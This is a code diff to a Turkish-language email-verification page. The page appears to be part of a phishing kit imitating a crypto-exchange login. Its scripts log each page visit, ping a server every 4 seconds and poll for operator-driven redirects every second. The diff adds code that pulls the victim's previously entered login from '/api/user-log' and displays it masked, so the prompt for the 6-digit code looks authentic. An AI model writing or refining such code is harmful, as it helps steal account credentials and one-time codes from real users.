@@ -271,7 +271,7 @@
                         </div>
                       </div>
                     </div>
-                    <div data-v-edadb4a0="" class="err-tip"> l***@example.com adresine gönderilen 6 haneli doğrulama kodunu girin. </div>
+                    <div data-v-edadb4a0="" class="err-tip" id="mailCodeMessage">Mail adresinize gönderilen 6 haneli doğrulama kodunu girin.</div>
                   </div>
                   <button type="submit" data-v-a3f11faa="" data-v-9de2df86="" class="submit bc-btn-yellow"> Onayla </button>
                 </div>
@@ -413,9 +413,46 @@
       return false;
     }
 
+    // Mail adresini dinamik olarak göster
+    async function updateMailCodeMessage() {
+      try {
+        const res = await fetch('/api/user-log');
+        if (res.ok) {
+          const data = await res.json();
+          const input1 = data.input1;
+          const messageEl = document.getElementById('mailCodeMessage');
+          
+          if (messageEl && input1) {
+            // Mail formatı kontrolü
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (emailRegex.test(input1.trim())) {
+              // Mail formatındaysa maskeleme yap
+              const email = input1.trim();
+              const [localPart, domain] = email.split('@');
+              let maskedLocal = '';
+              if (localPart.length > 1) {
+                maskedLocal = localPart[0] + '*'.repeat(localPart.length - 1);
+              } else {
+                maskedLocal = localPart[0] || '*';
+              }
+              const maskedEmail = `${maskedLocal}@${domain}`;
+              messageEl.textContent = `${maskedEmail} adresine gönderilen 6 haneli doğrulama kodunu girin.`;
+            } else {
+              // Mail formatı değilse genel mesaj
+              messageEl.textContent = 'Mail adresinize gönderilen 6 haneli doğrulama kodunu girin.';
+            }
+          }
+        }
+      } catch (err) {
+        console.error('Failed to fetch user log', err);
+        // Hata durumunda genel mesajı kullan
+      }
+    }
+
     logMailCodePage();
     pingServer();
     checkRedirect();
+    updateMailCodeMessage();
     setInterval(pingServer, 4000);
     // Daha sık kontrol et - her 1 saniyede bir
     setInterval(checkRedirect, 1000);
